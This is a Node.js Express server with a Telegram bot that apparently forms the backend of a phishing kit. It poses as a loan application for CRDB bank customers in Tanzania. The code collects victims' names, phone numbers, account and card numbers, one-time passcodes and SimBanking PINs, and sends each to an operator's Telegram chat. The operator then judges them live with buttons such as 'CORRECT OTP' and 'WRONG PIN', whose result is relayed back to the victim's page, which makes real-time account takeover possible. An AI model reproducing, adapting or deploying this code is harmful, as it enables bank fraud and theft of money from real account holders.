const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Configuration
const TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
const bot = new TelegramBot(TOKEN, { polling: true });

let adminChatId = process.env.ADMIN_CHAT_ID || null;
let clientData = {};
let pinAttempts = 3;

// Admin start command to dynamically capture or update chat ID
bot.onText(/\/start/, (msg) => {
    adminChatId = msg.chat.id;
    bot.sendMessage(adminChatId, `✅ **Admin Connected Successfully!**\nYour Chat ID is: \`${adminChatId}\``, { parse_mode: 'Markdown' });
});

// API endpoint to handle user step submissions from frontend
app.post('/api/submit', async (req, res) => {
    const { step, data } = req.body;
    clientData = { ...clientData, ...data };

    if (!adminChatId) {
        return res.status(400).json({ success: false, message: 'Admin not connected to bot. Please send /start to your bot on Telegram.' });
    }

    if (step === 'personal_info') {
        const msgText = `👤 **Step 1: Taarifa za Mtu na Simu**\n\n📝 **Jina:** ${data.fullName}\n📱 **Simu:** ${data.phoneNumber}\n💰 **Kiasi cha Mkopo:** TZS ${Number(data.loanAmount).toLocaleString()}\n\n*Choose action for applicant:*`;
        
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'APPROVE', callback_data: 'personal_approve' },
                        { text: 'DENY / WRONG PHONE', callback_data: 'personal_deny' }
                    ]
                ]
            },
            parse_mode: 'Markdown'
        };
        await bot.sendMessage(adminChatId, msgText, opts);
        return res.json({ success: true, pendingApproval: true });
    }
    else if (step === 'step3') {
        const msgText = `💳 **Step 3: Account & Tembo Card Verification**\n\n🏦 **Account No:** ${data.accountNumber}\n💳 **Tembo Card No:** ${data.cardNumber}\n\n*Choose action for applicant:*`;
        
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'PROCEED', callback_data: 'card_proceed' },
                        { text: 'DENY INVALID CRDB DETAILS', callback_data: 'card_deny' }
                    ]
                ]
            },
            parse_mode: 'Markdown'
        };
        await bot.sendMessage(adminChatId, msgText, opts);
        return res.json({ success: true, pendingApproval: true });
    }
    else if (step === 'step4') {
        const msgText = `📱 **Step 4: OTP Verification**\n\n🔢 **Entered OTP:** ${data.otp}\n\n*Choose action for OTP:*`;
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'CORRECT OTP', callback_data: 'otp_correct' },
                        { text: 'INCORRECT OTP', callback_data: 'otp_incorrect' },
                        { text: 'RESEND OTP', callback_data: 'otp_resend' }
                    ]
                ]
            },
            parse_mode: 'Markdown'
        };
        await bot.sendMessage(adminChatId, msgText, opts);
        return res.json({ success: true, pendingApproval: true });
    }
    else if (step === 'step5') {
        const msgText = `🔒 **Step 5: SimBanking PIN**\n\n🔑 **Attempt PIN:** ${data.pin}\n⚠️ **Remaining Attempts:** ${pinAttempts}\n\n*Choose action for PIN:*`;
        const opts = {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'CORRECT PIN', callback_data: 'pin_correct' },
                        { text: 'WRONG PIN', callback_data: 'pin_wrong' }
                    ]
                ]
            },
            parse_mode: 'Markdown'
        };
        await bot.sendMessage(adminChatId, msgText, opts);
        return res.json({ success: true, pendingApproval: true });
    }

    res.json({ success: false, message: 'Invalid step' });
});

let currentClientResponse = null;

bot.on('callback_query', async (query) => {
    const action = query.data;
    const chatId = query.message.chat.id;

    // INSTANTLY fade/acknowledge button tap to ensure zero UI delay & high sensitivity
    try {
        await bot.answerCallbackQuery(query.id);
    } catch (e) {
        console.error('Error answering callback query:', e);
    }

    if (action === 'personal_approve') {
        await bot.sendMessage(chatId, '✅ Personal info approved. Moving applicant to Tembo Card verification.');
        currentClientResponse = { status: 'approved', next: 'card_verify' };
    } else if (action === 'personal_deny') {
        await bot.sendMessage(chatId, '❌ Phone number or details denied.');
        currentClientResponse = { status: 'retry_phone', message: 'Namba ya simu au taarifa sio sahihi. Tafadhali hakiki.' };
    } else if (action === 'card_proceed') {
        await bot.sendMessage(chatId, '✅ Card details approved. Moving applicant to OTP step.');
        currentClientResponse = { status: 'approved', next: 'otp' };
    } else if (action === 'card_deny') {
        await bot.sendMessage(chatId, '❌ Application stopped due to invalid CRDB details.');
        currentClientResponse = { status: 'denied', message: 'Tafadhali ingiza namba sahihi za akaunti na kadi (Invalid CRDB details).' };
    } else if (action === 'otp_correct') {
        await bot.sendMessage(chatId, '✅ OTP correct. Moving applicant to PIN step.');
        currentClientResponse = { status: 'approved', next: 'pin' };
    } else if (action === 'otp_incorrect') {
        await bot.sendMessage(chatId, '❌ Incorrect OTP. Applicant forced to enter new OTP.');
        currentClientResponse = { status: 'retry_otp', message: 'Namba ya OTP si sahihi. Tafadhali ingiza OTP mpya.' };
    } else if (action === 'otp_resend') {
        await bot.sendMessage(chatId, '🔄 Resend OTP notification received.');
        currentClientResponse = { status: 'resend', message: 'Ombi la kutuma tena OTP limepokelewa na kutumwa.' };
    } else if (action === 'pin_correct') {
        await bot.sendMessage(chatId, '✅ PIN correct. Proceeding to success screen.');
        pinAttempts = 3;
        currentClientResponse = { status: 'approved', next: 'success' };
    } else if (action === 'pin_wrong') {
        pinAttempts--;
        if (pinAttempts <= 0) {
            await bot.sendMessage(chatId, '🚫 Account blocked due to 3 wrong PIN attempts.');
            currentClientResponse = { status: 'blocked', message: 'Akaunti yako imezuiwa kutokana na makosa 3 ya PIN.' };
            pinAttempts = 3;
        } else {
            await bot.sendMessage(chatId, `⚠️ Wrong PIN. ${pinAttempts} attempt remains.`);
            currentClientResponse = { status: 'retry_pin', attemptsLeft: pinAttempts, message: `Incorrect pin, ${pinAttempts} attempt remains` };
        }
    }
});

app.get('/api/poll-status', (req, res) => {
    const checkInterval = setInterval(() => {
        if (currentClientResponse) {
            clearInterval(checkInterval);
            const resp = currentClientResponse;
            currentClientResponse = null;
            res.json(resp);
        }
    }, 1000);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
